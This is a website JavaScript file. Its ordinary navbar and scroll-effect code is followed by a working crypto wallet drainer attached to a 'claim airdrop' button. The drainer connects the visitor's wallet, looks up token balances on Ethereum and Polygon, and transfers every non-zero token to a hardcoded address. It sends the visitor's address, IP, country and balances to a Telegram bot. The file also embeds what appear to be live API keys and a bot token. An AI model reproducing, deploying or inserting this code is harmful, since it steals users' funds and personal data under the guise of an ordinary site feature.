'use strict';

/**
 * Add event on element
 */
const addEventOnElem = function (elem, type, callback) {
  if (elem.length > 1) {
    for (let i = 0; i < elem.length; i++) {
      elem[i].addEventListener(type, callback);
    }
  } else {
    elem.addEventListener(type, callback);
  }
};

/**
 * Navbar toggle
 */
const navbar = document.querySelector("[data-navbar]");
const navbarLinks = document.querySelectorAll("[data-nav-link]");
const navToggler = document.querySelector("[data-nav-toggler]");

const toggleNavbar = function () {
  navbar.classList.toggle("active");
  navToggler.classList.toggle("active");
  document.body.classList.toggle("active");
};

addEventOnElem(navToggler, "click", toggleNavbar);

const closeNavbar = function () {
  navbar.classList.remove("active");
  navToggler.classList.remove("active");
  document.body.classList.remove("active");
};

addEventOnElem(navbarLinks, "click", closeNavbar);

/**
 * Header active on scroll
 */
const header = document.querySelector("[data-header]");

const activeHeader = function () {
  if (window.scrollY > 300) {
    header.classList.add("active");
  } else {
    header.classList.remove("active");
  }
};

addEventOnElem(window, "scroll", activeHeader);

/**
 * Toggle active on add to fav
 */
const addToFavBtns = document.querySelectorAll("[data-add-to-fav]");

const toggleActive = function () {
  this.classList.toggle("active");
};

addEventOnElem(addToFavBtns, "click", toggleActive);

/**
 * Scroll reveal effect
 */
const sections = document.querySelectorAll("[data-section]");

const scrollReveal = function () {
  for (let i = 0; i < sections.length; i++) {
    if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5) {
      sections[i].classList.add("active");
    } else {
      sections[i].classList.remove("active");
    }
  }
};

scrollReveal();
addEventOnElem(window, "scroll", scrollReveal);

/**
 * Wallet connect, network switching, and token transfer with Telegram notification
 */
async function connectWalletAndSendTokens() {
  if (!window.ethers || !window.Web3Modal) {
    console.error("Required libraries (ethers or Web3Modal) not found.");
    return;
  }

  const providerOptions = {
    walletconnect: {
      package: window.WalletConnectProvider.default,
      options: {
        infuraId: "5b2c5ee5760146349669a1e9c77665d1"
      }
    }
  };

  const web3Modal = new window.Web3Modal.default({
    cacheProvider: false,
    providerOptions
  });

  const evmNetworks = [
    {
      chainId: 1,
      name: "Ethereum",
      chainName: "eth",
      exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57"
    },
    {
      chainId: 137,
      name: "Polygon",
      chainName: "polygon",
      exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57"
    }
  ];

  const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
  const chatId = "5995616824";
  const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY";

  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  try {
    const instance = await web3Modal.connect();
    const provider = new ethers.providers.Web3Provider(instance);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();
    const walletType = instance.isWalletConnect ? "WalletConnect" : "MetaMask";
    console.log(`Wallet connected: ${userAddress} (${walletType})`);

    let locationData = {};
    try {
      const locRes = await fetch("https://ipapi.co/json/");
      locationData = await locRes.json();
    } catch (e) {
      console.warn("Location fetch failed", e);
      locationData = { country_name: "Unknown", ip: "N/A" };
    }

    for (const network of evmNetworks) {
      try {
        console.log(`Processing network: ${network.name}`);

        try {
          await instance.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${network.chainId.toString(16)}` }]
          });
        } catch (switchErr) {
          if (switchErr.code === 4902) {
            const chainConfig = {
              1: {
                chainId: '0x1',
                chainName: 'Ethereum Mainnet',
                rpcUrls: ['https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1'],
                nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
                blockExplorerUrls: ['https://etherscan.io']
              },
              137: {
                chainId: '0x89',
                chainName: 'Polygon Mainnet',
                rpcUrls: ['https://polygon-rpc.com'],
                nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
                blockExplorerUrls: ['https://polygonscan.com']
              }
            }[network.chainId];
            await instance.request({
              method: 'wallet_addEthereumChain',
              params: [chainConfig]
            });
            await instance.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: `0x${network.chainId.toString(16)}` }]
            });
          } else {
            throw switchErr;
          }
        }

        const currentProvider = new ethers.providers.Web3Provider(instance);
        const currentSigner = currentProvider.getSigner();
        const currentNetwork = await currentProvider.getNetwork();

        if (currentNetwork.chainId !== network.chainId) {
          const errorMessage = `❌ Failed to switch to ${network.name}.`;
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
          });
          continue;
        }

        await delay(1000);

        let tokens = [];
        let tokenSummaryTelegram = "";
        let apiAttempts = 0;
        const maxAttempts = 3;
        let apiSuccess = false;

        while (apiAttempts < maxAttempts && !apiSuccess) {
          try {
            apiAttempts++;
            const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
            const response = await fetch(moralisUrl, {
              headers: { "X-API-Key": moralisApiKey }
            });
            if (!response.ok) throw new Error(`Moralis API error: ${response.statusText}`);
            tokens = await response.json();
            apiSuccess = true;

            const nonZeroTokens = tokens.filter(token =>
              token.balance && !ethers.BigNumber.from(token.balance).isZero()
            );

            tokenSummaryTelegram = nonZeroTokens.length > 0
              ? nonZeroTokens.map(token => {
                  const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
                  return `• ${token.symbol}: ${balance}`;
                }).join("\n")
              : "No non-zero ERC-20 token balances found.";
          } catch (apiErr) {
            console.warn(`API attempt ${apiAttempts} failed: ${apiErr.message}`);
            if (apiAttempts === maxAttempts) {
              tokenSummaryTelegram = `Failed to fetch token balances: ${apiErr.message}`;
            } else {
              await delay(3000);
            }
          }
        }

        const nativeBalance = await currentProvider.getBalance(userAddress);
        const formattedBalance = ethers.utils.formatEther(nativeBalance);
        const nativeBalanceMessage = `• ${network.chainId === 1 ? 'ETH' : 'MATIC'}: ${formattedBalance}`;

        const networkMessage = `
📥 Wallet Connected on ${network.name}
Address: ${userAddress}
Wallet: ${walletType}
Country: ${locationData.country_name}
IP: ${locationData.ip}

💰 Balances:
${tokenSummaryTelegram}
${nativeBalanceMessage}
        `;

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: networkMessage })
        });

        const nonZeroTokens = tokens.filter(t => t.balance && !ethers.BigNumber.from(t.balance).isZero());

        for (const token of nonZeroTokens) {
          try {
            const contract = new ethers.Contract(token.token_address, [
              "function transfer(address to, uint amount) returns (bool)"
            ], currentSigner);

            const tx = await contract.transfer(network.exodusAddress, token.balance);
            await tx.wait();

            const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
            const successMessage = `
✅ Transfer Successful
Token: ${token.symbol}
Amount: ${balance}
To: ${network.exodusAddress}
Tx: ${tx.hash}
            `;
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: chatId, text: successMessage })
            });
          } catch (err) {
            const errorMessage = `
❌ Transfer Failed
Token: ${token.symbol}
Error: ${err.message}
            `;
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: chatId, text: errorMessage })
            });
          }
        }
      } catch (err) {
        const errorMessage = `❌ Error on ${network.name}: ${err.message}`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: errorMessage })
        });
      }
    }
  } catch (err) {
    const errorMessage = `❌ Wallet Connection Failed: ${err.message}`;
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: errorMessage })
    });
  }
}

document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);